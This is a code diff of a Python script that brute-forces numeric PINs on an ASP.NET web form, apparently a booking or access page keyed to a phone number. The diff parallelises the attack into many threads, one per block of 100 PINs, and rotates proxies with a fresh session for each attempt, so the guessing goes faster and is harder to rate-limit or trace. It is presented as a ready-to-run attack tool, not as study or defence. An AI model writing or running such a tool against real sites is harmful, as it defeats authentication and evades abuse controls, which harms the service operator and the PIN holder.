@@ -1,10 +1,16 @@
-import time
 import sys
 import itertools
+import threading
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from enum import Enum
+
 import requests
 from bs4 import BeautifulSoup
+
 import settings
+
+CHUNK_SIZE = 100  # one thread per 100 PINs
 
 
 class UserAgent(str, Enum):
@@ -18,49 +24,41 @@ HEADERS = {
     "Referer": settings.URL,
 }
 
-# Proxy rotation: cycles through the list indefinitely, or uses None (direct) if no proxies configured
 _proxy_cycle = itertools.cycle(settings.PROXIES) if settings.PROXIES else None
+_proxy_lock = threading.Lock()
 
 
 def make_session() -> requests.Session:
-    """Create a fresh session, optionally routing through the next proxy in the rotation."""
     s = requests.Session()
     s.headers.update(HEADERS)
     if _proxy_cycle:
-        proxy = next(_proxy_cycle)
+        with _proxy_lock:
+            proxy = next(_proxy_cycle)
         s.proxies.update({"http": proxy, "https": proxy})
     return s
 
 
-SESSION = make_session()
-
-
 def get_form_fields(html: str) -> dict:
-    """Extract all form input fields (including hidden and submit buttons) from ASP.NET page."""
     soup = BeautifulSoup(html, "html.parser")
     fields = {}
     for inp in soup.find_all("input"):
         name = inp.get("name")
-        value = inp.get("value", "")
         if name:
-            fields[name] = value
+            fields[name] = inp.get("value", "")
     for sel in soup.find_all("select"):
         name = sel.get("name")
         if name:
             option = sel.find("option", selected=True) or sel.find("option")
             fields[name] = option.get("value", "") if option else ""
-    # Include the first submit button so ASP.NET knows which button was clicked
     for btn in soup.find_all(["input", "button"], type="submit"):
         name = btn.get("name")
-        value = btn.get("value", "")
         if name and name not in fields:
-            fields[name] = value
+            fields[name] = btn.get("value", "")
             break
     return fields
 
 
 def get_visible_text(html: str) -> str:
-    """Extract only human-readable text, stripping all HTML tags."""
     soup = BeautifulSoup(html, "html.parser")
     for tag in soup(["script", "style", "input", "select", "option"]):
         tag.decompose()
@@ -68,7 +66,6 @@ def get_visible_text(html: str) -> str:
 
 
 def find_field(fields: dict, *keywords) -> str | None:
-    """Find a field name that contains any of the given keywords (case-insensitive)."""
     for key in fields:
         for kw in keywords:
             if kw.lower() in key.lower():
@@ -77,10 +74,10 @@ def find_field(fields: dict, *keywords) -> str | None:
 
 
 class ResponseState(Enum):
-    FORM    = "form"     # still on the pre-fill page, no result yet
-    FAIL    = "fail"     # submitted, PIN is not correct
-    SUCCESS = "success"  # submitted, PIN accepted
-    ERROR   = "error"    # non-200 or unexpected response
+    FORM    = "form"
+    FAIL    = "fail"
+    SUCCESS = "success"
+    ERROR   = "error"
 
 
 def classify(response: requests.Response) -> ResponseState:
@@ -94,23 +91,13 @@ def classify(response: requests.Response) -> ResponseState:
     return ResponseState.SUCCESS
 
 
-def is_fail(response: requests.Response) -> bool:
-    return classify(response) in (ResponseState.FAIL, ResponseState.ERROR, ResponseState.FORM)
-
-
-def is_success(response: requests.Response) -> bool:
-    return classify(response) == ResponseState.SUCCESS
-
-
 def get_form_action(html: str, base_url: str) -> str:
+    from urllib.parse import urljoin
     soup = BeautifulSoup(html, "html.parser")
     form = soup.find("form")
     if form and form.get("action"):
         action = form["action"]
-        if action.startswith("http"):
-            return action
-        from urllib.parse import urljoin
-        return urljoin(base_url, action)
+        return action if action.startswith("http") else urljoin(base_url, action)
     return base_url
 
 
@@ -128,17 +115,65 @@ def build_payload(fields: dict, name_field, phone_field, pin_field, adults_field
     return payload
 
 
-def fetch_fresh(url: str, session: requests.Session | None = None) -> tuple[dict, str]:
-    """GET the page and return (form_fields, raw_html)."""
-    s = session or SESSION
-    resp = s.get(url, timeout=15)
+def fetch_fresh(url: str, session: requests.Session) -> tuple[dict, str]:
+    resp = session.get(url, timeout=15)
     resp.raise_for_status()
     return get_form_fields(resp.text), resp.text
 
 
+# Shared state for threads
+_print_lock = threading.Lock()
+_found_event = threading.Event()
+_counter = [0]
+_counter_lock = threading.Lock()
+
+
+def try_chunk(
+    pins: list[int],
+    action_url: str,
+    name_field, phone_field, pin_field, adults_field, children_field,
+    total: int,
+) -> tuple[int, requests.Response] | None:
+    """Try a chunk of PINs sequentially. Returns (pin, response) on success, None otherwise."""
+    for pin in pins:
+        if _found_event.is_set():
+            return None
+
+        session = make_session()
+        try:
+            fresh_fields, _ = fetch_fresh(settings.URL, session)
+            payload = build_payload(fresh_fields, name_field, phone_field, pin_field, adults_field, children_field, pin)
+            post_resp = session.post(action_url, data=payload, timeout=15, allow_redirects=True)
+        except requests.RequestException as e:
+            with _print_lock:
+                print(f"\n[!] Error on PIN {pin}: {e}")
+            time.sleep(1)
+            continue
+
+        state = classify(post_resp)
+
+        with _counter_lock:
+            _counter[0] += 1
+            i = _counter[0]
+
+        pct = i / total * 100
+        with _print_lock:
+            print(f"\r[{i}/{total}] {pct:.1f}%  PIN: {pin:05d} | {state.value}    ", end="", flush=True)
+
+        if state == ResponseState.SUCCESS:
+            _found_event.set()
+            return pin, post_resp
+
+        if settings.DELAY > 0:
+            time.sleep(settings.DELAY)
+
+    return None
+
+
 def main():
     print(f"[*] Fetching page: {settings.URL}")
-    fields, page_html = fetch_fresh(settings.URL)
+    session = make_session()
+    fields, page_html = fetch_fresh(settings.URL, session)
     action_url = get_form_action(page_html, settings.URL)
 
     print(f"[*] Form action: {action_url}")
@@ -162,21 +197,11 @@ def main():
     if not phone_field or not pin_field:
         print("\n[!] Could not auto-detect phone/PIN fields.")
         print("[!] Available fields:", list(fields.keys()))
-        print("[!] Update field detection in main.py to match the actual field names above.")
         sys.exit(1)
 
     if not settings.PHONE:
         print("\n[!] PHONE is not set in .env")
         sys.exit(1)
-
-    print(f"\n[*] Name  : {settings.MY_NAME or '(not set)'}")
-    print(f"[*] Phone : {settings.PHONE}")
-    print(f"[*] Adults: {settings.ADULTS}  Children: {settings.CHILDREN}")
-    print(f"[*] PIN range: {settings.PIN_START} – {settings.PIN_END}")
-    if settings.PRIORITY_RANGE:
-        print(f"[*] Priority range: {settings.PRIORITY_RANGE.start} – {settings.PRIORITY_RANGE.stop - 1} (tried first)")
-    print(f"[*] Delay between attempts: {settings.DELAY}s")
-    print(f"[*] Starting brute force...\n")
 
     full_range = range(settings.PIN_START, settings.PIN_END + 1)
     priority = settings.PRIORITY_RANGE or range(0, 0)
@@ -184,31 +209,38 @@ def main():
     pin_sequence = list(priority) + [p for p in full_range if p not in priority_set]
     total = len(pin_sequence)
 
-    for i, pin in enumerate(pin_sequence, 1):
-        session = make_session()
-        try:
-            fresh_fields, _ = fetch_fresh(settings.URL, session)
-            payload = build_payload(fresh_fields, name_field, phone_field, pin_field, adults_field, children_field, pin)
-            post_resp = session.post(action_url, data=payload, timeout=15, allow_redirects=True)
-        except requests.RequestException as e:
-            print(f"[!] Request error on PIN {pin}: {e}")
-            time.sleep(1)
-            continue
+    # Split into chunks of CHUNK_SIZE
+    chunks = [pin_sequence[i:i + CHUNK_SIZE] for i in range(0, total, CHUNK_SIZE)]
+    num_threads = len(chunks)
 
-        state = classify(post_resp)
-        pct = i / total * 100
-        print(f"\r[{i}/{total}] {pct:.1f}%  Trying PIN: {pin:05d} | HTTP {post_resp.status_code} | {state.value}", end="", flush=True)
+    print(f"\n[*] Name   : {settings.MY_NAME or '(not set)'}")
+    print(f"[*] Phone  : {settings.PHONE}")
+    print(f"[*] Adults : {settings.ADULTS}  Children: {settings.CHILDREN}")
+    print(f"[*] PIN range  : {settings.PIN_START} – {settings.PIN_END}")
+    if settings.PRIORITY_RANGE:
+        print(f"[*] Priority   : {settings.PRIORITY_RANGE.start} – {settings.PRIORITY_RANGE.stop - 1} (tried first)")
+    print(f"[*] Threads    : {num_threads} ({CHUNK_SIZE} PINs each)")
+    print(f"[*] Delay      : {settings.DELAY}s\n")
 
-        if state == ResponseState.SUCCESS:
-            print(f"\n\n[+] SUCCESS! PIN found: {pin}")
-            print(f"[+] Response URL: {post_resp.url}")
-            print(f"[+] Page text: {get_visible_text(post_resp.text)[:300]}")
-            return
+    result = None
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = [
+            executor.submit(try_chunk, chunk, action_url, name_field, phone_field, pin_field, adults_field, children_field, total)
+            for chunk in chunks
+        ]
+        for future in as_completed(futures):
+            outcome = future.result()
+            if outcome is not None:
+                result = outcome
+                break
 
-        if settings.DELAY > 0:
-            time.sleep(settings.DELAY)
-
-    print(f"\n\n[-] No valid PIN found in range {settings.PIN_START}–{settings.PIN_END}.")
+    if result:
+        pin, resp = result
+        print(f"\n\n[+] SUCCESS! PIN found: {pin}")
+        print(f"[+] Response URL: {resp.url}")
+        print(f"[+] Page text: {get_visible_text(resp.text)[:300]}")
+    else:
+        print(f"\n\n[-] No valid PIN found in range {settings.PIN_START}–{settings.PIN_END}.")
 
 
 if __name__ == "__main__":
